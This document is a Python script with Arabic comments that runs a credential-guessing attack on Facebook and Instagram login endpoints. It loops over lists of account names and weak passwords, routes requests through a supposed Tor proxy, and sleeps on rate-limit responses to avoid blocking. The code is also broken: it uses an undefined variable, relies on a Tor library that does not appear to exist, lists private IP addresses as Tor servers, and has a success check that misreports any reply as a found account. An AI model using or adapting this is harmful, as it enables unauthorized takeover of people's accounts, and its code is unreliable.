import requests
import time
import random
import tor 
import socks

# عناوين IP عشوائية لخوادم Tor
tor_ips = [
    "192.168.1.1",
    "192.168.1.2",
    "192.168.1.3",
    "192.168.1.4",
    "192.168.1.5",
]

# كلمات مرور عشوائية
passwords = [
    "1234567890",
    "11223344556677889900",
    "islamislam",
    "alahalah",
    "moslim",
]

# حسابات عشوائية
accounts = [
    "mohamed mohamed ",
    "islam islam",
    "alah alah",
    "jhon jhon",
    "ahmed ahmed",
    "adem adem",
]

# دالة لإنشاء وكيل Tor
def create_tor_proxy():
    # قم بإنشاء جلسة Tor
    session = tor.TorSession()

    # قم بإنشاء وكيل SOCKS5
    proxy = socks.SOCKS5(session.get_socket())

    return proxy

# دالة لمنع الحظر
def prevent_block(response):
    # تحقق مما إذا كان الاستجابة تحتوي على خطأ
    if response.status_code == 429:
        # قم بزيادة الفاصل الزمني بين المحاولات
        time.sleep(random.randint(60, 120))

# دالة للتخمين على حساب Facebook
def guess_facebook(username, password):
    # قم بإنشاء وكيل Tor
    proxy = create_tor_proxy()

    # قم بإنشاء رأس HTTP
    headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36"}

    # قم بإنشاء طلب HTTP
    request = requests.post(
        "https://www.facebook.com/login.php",
        headers=headers,
        proxies={"http": proxy, "https": proxy},
        data={"email": username, "pass": password},
    )

    # قم بمنع الحظر
    prevent_block(response)

    # تحقق مما إذا كان الاستجابة تحتوي على رسالة خطأ
    if "checkpoint" in response.text:
        # تم حظر الحساب
        print("Account is blocked:", username)
    else:
        # تم العثور على الحساب
        print("Found account:", username, password)

# دالة للتخمين على حساب Instagram
def guess_instagram(username, password):
    # قم بإنشاء وكيل Tor
    proxy = create_tor_proxy()

    # قم بإنشاء رأس HTTP
    headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36"}

    # قم بإنشاء طلب HTTP
    request = requests.post(
        "https://www.instagram.com/accounts/login/ajax/",
        headers=headers,
        proxies={"http": proxy, "https": proxy},
        data={"username": username, "password": password},
    )

    # قم بمنع الحظر
    prevent_block(response)

    # تحقق مما إذا كان الاستجابة تحتوي على رسالة خطأ
    if "checkpoint_required" in response.text:
        # تم حظر الحساب
        print("Account is blocked:", username)
    else:
        # تم العثور على الحساب
        print("Found account:", username, password)

# قم بتشغيل الحلقة الرئيسية
for username in accounts:
    for password in passwords:
        guess_facebook(username, password)
        guess_instagram(username, password)
